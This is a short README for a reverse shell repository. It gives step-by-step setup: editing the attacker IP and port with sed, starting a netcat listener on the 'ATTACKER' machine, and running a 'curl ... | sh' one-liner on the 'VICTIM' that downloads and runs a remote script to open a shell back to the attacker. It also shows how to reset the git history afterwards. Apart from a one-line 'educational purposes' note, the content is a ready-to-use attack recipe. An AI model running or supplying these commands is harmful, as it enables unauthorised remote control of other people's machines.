# Reverse Shell
Please use the current source code for educational purposes.

## Setting
1. Fork Current Repository

2. Git Clone
```sh
git clone https://github.com/<<YOUR_REPOSITORY>>/reverse_shell.git
```

3. Change REMOTE_IP and REMOTE_PORT in reverse_shell file
```sh
cd <<YOUR_REPOSITORY>>
sed -i -e 's/REMOTE_IP/192.168.0.1/g' reverse_shell
sed -i -e 's/REMOTE_PORT/12345/g' reverse_shell
```

4. Git Commit and Git Push
```sh
cd <<YOUR_REPOSITORY>>
git commit -m 'Change REMOTE_IP and REMOTE_PORT(192.168.0.1:12345)' .
git push -u origin master
```

## TEST
### ATTACKER(192.168.0.1)
```sh
nc -lk 12345
```

### VICTIM(192.168.0.130)
```sh
Usage: curl https://raw.githubusercontent.com/<<YOUR_REPOSITORY>>/reverse_shell/master/reverse_shell |sh

curl https://raw.githubusercontent.com/kisec/reverse_shell/master/reverse_shell |sh
```

## RESET
Delete your repository or Git rest
```sh
cd <<YOUR_REPOSITORY>>
git reflog
git reset HEAD@{<<INIT_COMMIT_NUMBER>>}
git push origin +master

```

## Thanks
 - Reverse Shell as a Service - https://github.com/lukechilds/reverse-shell
 - Reverse Shell as a Service - https://shell.now.sh/
